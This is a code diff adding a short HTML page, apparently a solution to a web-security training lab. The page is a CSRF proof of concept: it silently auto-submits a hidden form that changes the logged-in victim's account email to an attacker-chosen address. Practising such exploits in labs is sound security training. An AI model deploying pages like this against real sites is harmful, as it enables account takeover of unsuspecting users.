@@ -1,0 +1,12 @@
+<html>
+<!-- CSRF PoC - 自动提交版本 -->
+<body>
+<script>history.pushState('', '', '/')</script>
+<form action="https://0a8700a2038fb49c808e4e7400d600f2.web-security-academy.net/my-account/change-email" method="POST" id="csrf-form">
+ <input type="hidden" name="email" value="ckf1352@qq.com" />
+</form>
+<script>
+ document.getElementById('csrf-form').submit();
+</script>
+</body>
+</html>
